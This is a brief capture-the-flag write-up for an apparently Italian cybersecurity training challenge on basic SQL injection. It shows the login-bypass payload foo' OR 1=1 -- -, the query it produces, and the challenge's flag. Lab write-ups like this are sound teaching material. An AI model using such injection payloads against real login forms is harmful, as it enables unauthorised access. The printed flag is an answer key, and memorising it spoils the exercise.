# URL
https://training.olicyber.it/challenges#challenge-356

# Concept
To Perform SQL injection in the simplest form for now ..

# Method of Solve
- Go to the challenge Interface and visit the Target URL
- Read all the theory provided and follow the instructions
- Get the Flag
  ```
    foo' OR 1=1 -- -
  ```
- The actual query executed is :
  ```
    SELECT * FROM login WHERE password = 'foo' OR 1=1 -- -'
  ```
- The Flag is **flag{1s_ths_h0w_l0g1ns_w0rk}**
